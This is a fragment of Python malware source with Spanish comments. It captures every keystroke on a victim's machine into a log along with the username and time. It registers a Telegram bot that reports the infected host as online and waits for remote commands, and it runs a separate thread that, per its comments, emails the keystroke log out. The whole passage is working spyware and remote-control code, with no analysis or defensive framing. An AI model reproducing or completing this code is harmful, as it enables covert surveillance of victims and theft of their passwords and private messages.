        getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
        with open (log, "a") as f:
            f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
    except: # Si no puede crear el archivo, crea el directorio faltante
        pass
    def on_press(key):
        w = ""
        with open(log, "a") as f:
            if (len(str(key)))  <= 3:
                print(KeyConMin(str(key)))
                
                f.write(KeyConMin(str(key)))
            else:
                print(KeyConMax(str(key)))
                f.write(KeyConMax(str(key)))
    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
        listener.join() 
cd.log('s', 'Configuración Terminada')
cd.log('i', 'Iniciando')
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
    helloWorld = platform.uname()[1] + ":    ==>> Está en linea..."
    for known_id in known_ids:
        send_safe_message(bot, known_id, helloWorld)
    print(helloWorld)
cd.log('s', 'Iniciando Hilo de Keylogger')
cd.log('i', 'Keylogger iniciado')

p1 = threading.Thread(target=Klogger)   # Keylogger 
p2 = threading.Thread(target=SendLog)   # Envía keylogger por correo
p2.start()  # Inicia hilo de keylogger
p1.start()  # Inicia hilo de envío de correo
cd.log('s', 'Todo se ejecutó con exito\n')
cd.log('i', 'Esperando comandos ==>>          ' + platform.uname()[1] + '...\n\n')
pythoncom.PumpMessages()  # Escucha los comandos
p1.join()
